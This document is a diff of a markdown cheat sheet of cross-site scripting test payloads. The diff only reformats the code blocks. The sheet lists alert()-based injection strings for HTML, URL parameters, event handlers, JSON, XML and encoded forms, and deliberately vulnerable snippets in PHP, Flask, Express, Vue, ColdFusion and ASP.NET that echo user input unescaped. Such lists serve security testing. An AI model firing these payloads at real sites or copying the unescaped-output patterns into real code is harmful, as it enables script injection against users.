@@ -3,70 +3,85 @@ XSS quick fire samples:
 
 HTML/JavaScript
 
-1. ```<script>alert('XSS')</script>```
+  ```html
+  <script>alert('XSS')</script>
+  ```
+
+```html
+<img src=x onerror=alert('XSS')>
+```
+
+```html
+<svg><script>alert('XSS')</script></svg>
+```
+
+ ```html
+ <iframe src="javascript:alert('XSS')"></iframe>
+```
+
+```html
+<body onload=alert('XSS')>
+```
 
 
-2. ```<img src=x onerror=alert('XSS')>```
 
+URL Parameters:
 
-3. ```<svg><script>alert('XSS')</script></svg>```
+ ```url
+ http://example.com/?q=<script>alert('XSS')</script>
+```
 
-
-4. ```<iframe src="javascript:alert('XSS')"></iframe>```
-
-
-5. ```<body onload=alert('XSS')>```
-
-
-
-URL Parameters
-
-1. ```http://example.com/?q=<script>alert('XSS')</script>```
-
-
-2. ```http://example.com/?q=<img src=x onerror=alert('XSS')>```
+```url
+http://example.com/?q=<img src=x onerror=alert('XSS')>
+```
 
 
 
 JavaScript (JavaScript Events)
 
-1. ```<a href="#" onclick="alert('XSS')">Click me</a>```
+```javascript
+<a href="#" onclick="alert('XSS')">Click me</a>
+```
 
-
-2. ```<div onmouseover="alert('XSS')">Hover over me</div>```
+```javascript
+<div onmouseover="alert('XSS')">Hover over me</div>
+```
 
 
 
 JSON
-```
+```jsom
 {"data": "<script>alert('XSS')</script>"}
 ```
 XML
-```
+```xml
 <data><![CDATA[<script>alert('XSS')</script>]]></data>
 ```
 
 PHP (Common Injections)
 
-1. ```
+```php
    <?php echo '<script>alert("XSS")</script>'; ?>
-   ```
+```
 
 
-2. ``` <?php echo $_GET['input']; ?> ```
+```php
+<?php echo $_GET['input']; ?>
+```
 
 
 
 ASP.NET
-```
+```asp
 <%= "<script>alert('XSS')</script>" %>
 ```
 Ruby on Rails (ERB)
-```
+```ruby
 <%= "<script>alert('XSS')</script>".html_safe %>
 ```
 Python (Flask)
-```
+
+```python
 from flask import Flask, render_template_string
 
 app = Flask(__name__)
@@ -76,14 +91,14 @@ def index(input):
     return render_template_string(f"<script>alert('{input}')</script>")
 ```
 Node.js (Express)
-```
+```node.js
 app.get('/input', (req, res) => {
     const input = req.query.input;
     res.send(`<script>alert('${input}')</script>`);
 });
 ```
 AngularJS
-```
+```angular
 <div ng-bind="userInput"></div>
 <script>
     var app = angular.module('myApp', []);
@@ -93,7 +108,7 @@ AngularJS
 </script>
 ```
 Vue.js
-```
+```vue
 <div v-html="userInput"></div>
 <script>
     new Vue({
@@ -105,41 +120,41 @@ Vue.js
 </script>
 ```
 ASP Classic
-```
+```asp
 <%
 Response.Write "<script>alert('XSS')</script>"
 %>
 ```
 ColdFusion
-```
+```cf
 <cfoutput>
     <script>alert('#form.input#')</script>
 </cfoutput>
 ```
 C# (ASP.NET MVC)
-```
+```c#
 @Html.Raw("<script>alert('XSS')</script>")
 ```
 Common Encodings:
 
 URL encoding:
-```
+```url
 %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
 ```
 HTML encoding: 
 
-```
+```html
 &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
 ```
 
 Special Cases:
 
 CSS injection: background-image: 
-```
+```css
 url("javascript:alert('XSS')")
 ```
 JSONP: 
-```
+```jsonp
 callbackFunction(<script>alert('XSS')</script>)
 ```
 
